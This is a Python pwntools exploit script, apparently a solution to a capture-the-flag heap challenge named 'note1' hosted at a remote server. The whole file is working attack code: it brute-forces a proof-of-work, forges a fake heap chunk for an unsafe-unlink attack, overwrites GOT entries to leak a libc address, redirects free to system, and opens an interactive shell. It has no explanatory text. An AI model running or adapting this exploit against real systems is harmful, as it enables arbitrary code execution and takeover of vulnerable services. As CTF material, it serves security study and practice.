#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./note1')
libc = ELF('libc-2.23.so')
p = remote('chuj.top', '52525')
# p = process('./note1')

def create(index, size, content):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('index?\n')
    p.recvuntil('>> ')
    p.sendline(str(index))
    p.recvuntil('size?\n')
    p.recvuntil('>> ')
    p.sendline(str(size))
    p.recvuntil('content?\n')
    p.recvuntil('>> ')
    p.sendline(content)

def edit(index, content):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('index?\n')
    p.recvuntil('>> ')
    p.sendline(str(index))
    p.sendline(content)

def delete(index):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('index?\n')
    p.recvuntil('>> ')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

from pwnlib.util.iters import mbruteforce
import itertools
import base64

p.recvuntil(') == ')
hash_code = p.recvuntil('\n', drop=True).decode().strip()
log.success('hash_code={},'.format(hash_code))

charset = string.printable
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')

p.sendlineafter('????> ', proof)

create(0,0x10,'123')
create(1,0x20,'456')
create(2,0x80,'456')

delete(0)
ptr = 0x4040C0
fd = ptr-0x18
bk = ptr-0x10
fake_chunk = flat(
    'a'*8,0x41,
    fd, bk,
    'a'*0x8*4,
    0x40,0x90
)

create(0,0x10,'123')

edit(0,fake_chunk)

delete(2)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']
# create(0x80,'abc')
payload = b'a'*0x18+p64(free_got)+p64(puts_got)
edit(0,payload)

edit(0,p64(puts_plt)[:-1])



delete(1)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))
libc.address = puts_addr-libc.sym['puts']
log.success('libc.address: ' + hex(libc.address))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
binsh_addr = next(libc.search(b'/bin/sh'))
log.success('binsh_addr: ' + hex(binsh_addr))

# debug()

edit(0,p64(system_addr)[:-1])

create(1,0x20,b'/bin/sh\x00')
delete(1)

p.interactive()